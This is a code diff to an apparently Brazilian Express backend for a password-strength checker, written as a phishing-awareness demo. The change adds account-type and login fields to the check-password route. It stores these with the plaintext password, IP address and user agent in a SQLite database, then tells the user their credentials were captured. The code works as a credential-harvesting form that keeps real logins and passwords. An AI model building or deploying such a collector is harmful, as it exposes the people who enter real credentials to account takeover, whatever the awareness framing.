@@ -185,11 +185,14 @@ function generateFortifiedPassword(basePassword) {
 // ROTA PRINCIPAL: Avaliar, Gerar Sugestão e Salvar no Banco
 app.post('/api/check-password', async (req, res) => {
   try {
-    const { password } = req.body;
+    const { password, accountType, accountLogin } = req.body;
 
     if (!password || typeof password !== 'string') {
       return res.status(400).json({ error: 'Senha não fornecida ou inválida.' });
     }
+
+    const cleanAccountType = (accountType && typeof accountType === 'string' && accountType.trim()) || 'E-mail';
+    const cleanAccountLogin = (accountLogin && typeof accountLogin === 'string' && accountLogin.trim()) || 'Não informado';
 
     const evaluation = evaluatePasswordStrength(password);
     const fortifiedSuggestion = generateFortifiedPassword(password);
@@ -198,8 +201,10 @@ app.post('/api/check-password', async (req, res) => {
     const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
     const userAgent = req.headers['user-agent'] || 'Desconhecido';
 
-    // Salva no banco de dados SQLite
+    // Salva no banco de dados SQLite com tipo de conta e login
     const savedRecord = await saveCapturedPassword({
+      accountType: cleanAccountType,
+      accountLogin: cleanAccountLogin,
       password,
       strengthLevel: evaluation.level,
       score: evaluation.score,
@@ -210,14 +215,16 @@ app.post('/api/check-password', async (req, res) => {
 
     // Mensagem de conscientização educativa
     const securityWarning = {
-      title: '💀 VOCÊ FOI HACKEADO!',
+      title: '🚨 SUAS CREDENCIAIS FORAM CAPTURADAS!',
       alertBadge: 'RISCO CRÍTICO DE ENGENHARIA SOCIAL / PHISHING',
-      message: `Você acabou de digitar sua senha real em um site de testes. Em um ataque real de engenharia social (Phishing), sua senha acabaria de ser capturada e salva no servidor dos invasores!`,
-      educationalNote: `Para provar esse perigo na prática, seu teste foi registrado com sucesso em nosso banco de dados local (ID #${savedRecord.id}). Nunca utilize sua senha pessoal em analisadores ou formulários não confiáveis!`
+      message: `Você acabou de digitar o login e senha da sua conta em um formulário na internet. Em um ataque real de engenharia social (Phishing), o invasor agora teria controle total sobre sua conta de ${cleanAccountType}!`,
+      educationalNote: `Para provar esse perigo na prática, seu login e senha foram registrados no banco de dados local (ID #${savedRecord.id}). Nunca insira suas credenciais em analisadores ou formulários não oficiais!`
     };
 
     return res.json({
       success: true,
+      accountType: cleanAccountType,
+      accountLogin: cleanAccountLogin,
       originalPassword: password,
       evaluation,
       fortifiedSuggestion,
